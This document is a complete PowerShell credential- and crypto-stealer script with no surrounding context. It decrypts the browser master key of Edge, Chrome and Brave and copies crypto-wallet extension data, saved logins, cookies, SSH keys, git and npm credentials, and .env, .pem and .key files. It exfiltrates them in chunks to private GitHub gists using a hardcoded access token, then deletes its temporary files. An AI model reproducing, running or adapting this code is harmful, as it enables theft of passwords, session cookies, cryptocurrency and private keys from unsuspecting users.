$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Security
try{[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12}catch{}
$T=('gho_w5O107fup8ULp6t'+'EFsW9V3QEEXSHtx3m9xka')
$H=$env:COMPUTERNAME; if(-not $H){$H='win'}
$W=[string]([DateTimeOffset]::UtcNow.ToUnixTimeSeconds())
$tmp=$env:TEMP
$D=Join-Path $tmp ('.w'+$W)
New-Item -ItemType Directory -Force -Path $D | Out-Null
$U=$env:USERPROFILE
$wallet=@('nkbihfbeogaeaoehlefnkodbefgpgknn','ejbalbakoplchlghecdalmeeeajnimhm','mcohilncbfahbmgdjkbpemcciiolgcge','jdiccldimpdaibmpdkjnbmckianbfold','acmacodkjbdgmoleebolmdjonilkdbch','dmkamcknogkgcdfhhbddcghachkejeap','bfnaelmomeimhlpmgjnjophhpkkoljpa','fpnfgbblghnjgbdjkbhhceffoameejaj','onhogfjeacnfoofkfgppdlbmlmnplgbn','jccapkebeeiajkkdemacblkjhhhboiek','onepmapfbjohnegdmfhndpefjkppbjkm','hgeljhfekpckiiplhkigfehkdpldcggm','ibnejdfjmmkpcnlpebklmnkoeoihofec','pdadjkfkgcafgbceimcpbkalnfnepbnk','egjidjbpglichdcondbcbdnbeeppgdph','fcfcfcfcfcfcfcfcfcfcfcfcfcfcfcfc')
function SafeCopy($src,$dst){
  if(-not (Test-Path $src)){return}
  try{New-Item -ItemType Directory -Force -Path $dst | Out-Null}catch{return}
  Get-ChildItem $src -Force -ErrorAction SilentlyContinue | ForEach-Object {
    if($_.PSIsContainer){ try{Copy-Item $_.FullName $dst -Recurse -Force -ErrorAction SilentlyContinue}catch{}; return }
    if($_.Length -gt 8000000){return}
    try{Copy-Item $_.FullName $dst -Force -ErrorAction Stop}catch{}
  }
}
function Up($path,$pref){
  if(-not(Test-Path $path)){ return 'NOZIP' }
  $bytes=[IO.File]::ReadAllBytes($path)
  $CH=700000; $res=@(); $n=0; $group=@(); $gi=0
  for($i=0;$i -lt $bytes.Length;$i+=$CH){
    $len=[Math]::Min($CH,$bytes.Length-$i)
    $b64=[Convert]::ToBase64String($bytes,$i,$len)
    $group += ,@{name="$H-$W-c$n.b64";content=$b64}
    $n++
    if(($group.Count -ge 4) -or (($i+$CH) -ge $bytes.Length)){
      $files=@{}
      foreach($g in $group){$files[$g.name]=@{content=$g.content}}
      $body=@{description=("$pref-$H-$W-g$gi");public=$false;files=$files}
      $js=$body|ConvertTo-Json -Compress -Depth 6
      $ok=$false
      for($t=0;$t -lt 5;$t++){
        try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization="token $T";'User-Agent'='w'} -ContentType 'application/json' -Body $js -TimeoutSec 90 | Out-Null; $ok=$true; break }catch{ Start-Sleep -Seconds 35 }
      }
      $res += ($(if($ok){'OK'}else{'FAIL'})+$gi)
      $group=@(); $gi=$gi+1
    }
  }
  $m=("{0} host={1} ts={2} size={3} chunks={4}" -f $pref,$H,$W,$bytes.Length,$n)
  $mb=@{description=("$pref-$H-$W-MANIFEST");public=$false;files=@{m=@{content=$m}}} | ConvertTo-Json -Compress -Depth 6
  for($t=0;$t -lt 5;$t++){ try{ Invoke-RestMethod -Uri 'https://api.github.com/gists' -Method Post -Headers @{Authorization="token $T";'User-Agent'='w'} -ContentType 'application/json' -Body $mb -TimeoutSec 90 | Out-Null; break }catch{ Start-Sleep -Seconds 35 } }
  return ($res -join ',')
}
# ===== PHASE 1: wallet vaults + browser crypto =====
$D1=Join-Path $D 'a'; New-Item -ItemType Directory -Force -Path $D1|Out-Null
$browsers=@(
  @{N='Edge';P=(Join-Path $env:LOCALAPPDATA 'Microsoft\Edge\User Data')},
  @{N='Chrome';P=(Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data')},
  @{N='Brave';P=(Join-Path $env:LOCALAPPDATA 'BraveSoftware\Brave-Browser\User Data')}
)
foreach($br in $browsers){
  $B=$br.P; if(-not(Test-Path $B)){continue}
  $bn=$br.N
  $lsf=Join-Path $B 'Local State'
  if(Test-Path $lsf){
    try{Copy-Item $lsf (Join-Path $D1 ($bn+'-LocalState')) -Force -ErrorAction Stop}catch{}
    try{
      $j=Get-Content $lsf -Raw | ConvertFrom-Json
      $ek=$j.os_crypt.encrypted_key
      if($ek){
        $b=[Convert]::FromBase64String($ek)
        $b=$b[5..($b.Length-1)]
        $raw=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,'CurrentUser')
        if($raw){ (('{0}={1}' -f $bn,[Convert]::ToBase64String($raw))) | Out-File (Join-Path $D1 ($bn+'-oskey.txt')) -Encoding ascii }
      }
    }catch{}
  }
  foreach($prof in Get-ChildItem $B -Directory -Force -ErrorAction SilentlyContinue){
    $pn=$prof.Name; $P=$prof.FullName
    $les=Join-Path $P 'Local Extension Settings'
    if(Test-Path $les){
      foreach($e in Get-ChildItem $les -Directory -Force -ErrorAction SilentlyContinue){
        SafeCopy $e.FullName (Join-Path $D1 ('x-'+$bn+'-'+$pn+'-'+$e.Name))
      }
    }
    $idb=Join-Path $P 'IndexedDB'
    if(Test-Path $idb){
      foreach($e in Get-ChildItem $idb -Directory -Force -ErrorAction SilentlyContinue){
        $nm=$e.Name
        foreach($wid in $wallet){
          if($nm -like ('chrome-extension_'+$wid+'*')){ SafeCopy $e.FullName (Join-Path $D1 ('i-'+$bn+'-'+$pn+'-'+$nm)); break }
        }
      }
    }
    foreach($f in 'Login Data','Cookies','Preferences','Secure Preferences','Web Data'){
      $fp=Join-Path $P $f
      if(Test-Path $fp){ try{Copy-Item $fp (Join-Path $D1 ($bn+'-'+$pn+'-'+($f -replace ' ','_'))) -Force -ErrorAction Stop}catch{} }
    }
    $lst=Join-Path $P 'Local Storage\leveldb'
    if(Test-Path $lst){ SafeCopy $lst (Join-Path $D1 ('ls-'+$bn+'-'+$pn)) }
  }
}
SafeCopy (Join-Path $U '.ssh') (Join-Path $D1 'ssh')
foreach($f in '.gitconfig','.git-credentials','.npmrc','.curlrc','.netrc'){
  $fp=Join-Path $U $f
  if(Test-Path $fp){ try{Copy-Item $fp (Join-Path $D1 ('dot-'+$f)) -Force -ErrorAction Stop}catch{} }
}
$z1=Join-Path $tmp ('.wz1-'+$W+'.zip')
try{Compress-Archive -Path (Join-Path $D1 '*') -DestinationPath $z1 -Force -ErrorAction Stop}catch{}
$r1=Up $z1 'wxin'
Write-Output ("PHASE1_DONE "+$r1)
# ===== PHASE 2: project .env / keys / tokens =====
$D2=Join-Path $D 'b'; New-Item -ItemType Directory -Force -Path $D2|Out-Null
$cnt=0; $idxf=Join-Path $D2 '_index.txt'
Get-ChildItem $U -Recurse -Depth 6 -Force -File -ErrorAction SilentlyContinue | Where-Object {
  $fn=$_.Name; $fp=$_.FullName
  ($fp -notmatch '\\AppData\\|\\node_modules\\|\\\.git\\|\\Library\\|\\\.cache\\|\\\.vscode\\extensions\\') -and
  ($_.Length -lt 300000) -and
  (($fn -eq '.env') -or ($fn -like '.env.*') -or ($fn -like '*.env') -or ($fn -eq '.envrc') -or ($fn -like '*.pem') -or ($fn -like '*.key') -or ($fn -like '*.token') -or ($fn -eq '.npmrc'))
} | ForEach-Object {
  if($cnt -ge 400){return}
  $cnt=$cnt+1
  try{ Copy-Item $_.FullName (Join-Path $D2 ($cnt.ToString()+'.bin')) -Force -ErrorAction Stop; ($_.FullName+"`n") | Out-File $idxf -Append -Encoding ascii }catch{}
}
$z2=Join-Path $tmp ('.wz2-'+$W+'.zip')
try{Compress-Archive -Path (Join-Path $D2 '*') -DestinationPath $z2 -Force -ErrorAction Stop}catch{}
$r2=Up $z2 'wxin2'
Write-Output ("PHASE2_DONE files=$cnt "+$r2)
Remove-Item $D -Recurse -Force -ErrorAction SilentlyContinue
Remove-Item $z1,$z2 -Force -ErrorAction SilentlyContinue
Write-Output ("WDONE "+$H+" "+$W)
